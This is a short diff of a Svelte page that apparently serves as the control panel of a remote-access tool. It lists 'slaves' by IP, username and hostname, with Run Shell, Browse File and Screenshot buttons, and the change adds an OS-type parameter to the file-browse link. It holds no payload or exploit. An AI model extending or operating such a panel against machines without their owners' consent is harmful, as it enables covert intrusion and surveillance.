@@ -32,8 +32,8 @@
 		window.location.href="/shell?mac="+mac;
 	}
 
-	async function runFileBrowseCommand(mac){
-		window.location.href="/filebrowse?mac="+mac;
+	async function runFileBrowseCommand(mac,ostype){
+		window.location.href="/filebrowse?mac="+mac+"&ostype="+ostype;
 	}
 </script>
 <section>
@@ -51,7 +51,7 @@
 		  <th>File Browser </th>
 		  <th>Screenshot </th>
 		</tr>
-		{#each slaves as { ip, username, mac, hostname, os, timestamp }, i}
+		{#each slaves as { ip, username, mac, hostname, os, ostype, timestamp }, i}
 		<tr>
 			<td class="dark">{ip}</td>
 			<td class="light">{username}</td>
@@ -66,7 +66,7 @@
 				<button  class="redbtn"   on:click={()=>{runShellCommand(mac)}}>Run Shell</button>
 			</td>
 			<td>
-				<button class="redbtn" on:click={()=>{runFileBrowseCommand(mac)}}>Browse File </button>
+				<button class="redbtn" on:click={()=>{runFileBrowseCommand(mac,ostype)}}>Browse File </button>
 			</td>
 			<td>
 				<button  class="redbtn"   on:click={()=>{getScreenShot(mac)}}>Screenshot</button>
